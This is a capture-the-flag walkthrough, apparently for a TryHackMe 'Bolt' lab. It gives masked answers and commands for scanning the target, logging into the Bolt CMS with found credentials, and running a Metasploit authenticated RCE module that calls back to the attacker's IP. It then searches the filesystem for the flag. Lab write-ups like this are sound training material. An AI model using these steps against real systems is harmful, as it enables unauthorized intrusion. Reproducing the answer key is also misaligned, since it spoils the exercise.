# Bolt

- Start the machine

	  no answer needed

-  What port number has a web server with a CMS running?

	- `nmap -sV <TARGET_IP>`
	- `8000`

- What is the username we can find in the CMS?

	- `bolt`

- What is the password we can find for the username?

	- `*****d*in123`

- What version of the CMS is installed on the server? (Ex: Name 1.1.1)

	- Login into the page `<TARGET_IP>/bolt` with username and password previously found.
	- `Bolt 3.7.1`

- There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?

	- Search on Google `Bolt RCE Exploit DB`
	- `***2*`

- Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)

	- `msfconsole`
	- `search bolt`
	- `use *`
	- `exploit/unix/******************************`

- Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit

	  no answer needed

	- `set LHOST <YOUR_IP>`
	- `set LPORT 1234`
	- `set RHOST <TARGET_IP>`
	- `set USERNAME bolt`
	- `set PASSWORD ************`

- Look for flag.txt inside the machine.

	- `exploit`
	- `cat $(find / | grep flag.txt)`
	- `THM{***************************}`




